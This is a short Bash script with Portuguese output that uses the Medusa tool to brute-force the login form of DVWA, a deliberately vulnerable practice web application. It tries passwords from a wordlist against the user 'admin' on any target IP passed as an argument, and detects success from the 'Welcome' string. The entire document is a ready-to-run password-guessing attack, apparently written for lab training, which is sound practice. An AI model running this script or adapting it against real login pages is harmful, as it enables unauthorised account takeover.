#!/bin/bash

echo "=== Ataque Web-Form DVWA com Medusa ==="

if [ -z "$1" ]; then
    echo "Uso: $0 <IP_ALVO>"
    exit 1
fi

TARGET=$1
USER="admin"
WORDLIST="../wordlists/dvwa.txt"
FORM="/DVWA/login.php"

echo "Alvo: $TARGET"
echo "Usuário: $USER"
echo "Wordlist: $WORDLIST"
echo "Formulário: $FORM"

medusa -h "$TARGET" -u "$USER" -P "$WORDLIST" -M web-form \
    -m FORM:"$FORM" \
    -m USER:"username" \
    -m PASS:"password" \
    -m DENY:"Login failed" \
    -m SUCCESS:"Welcome"
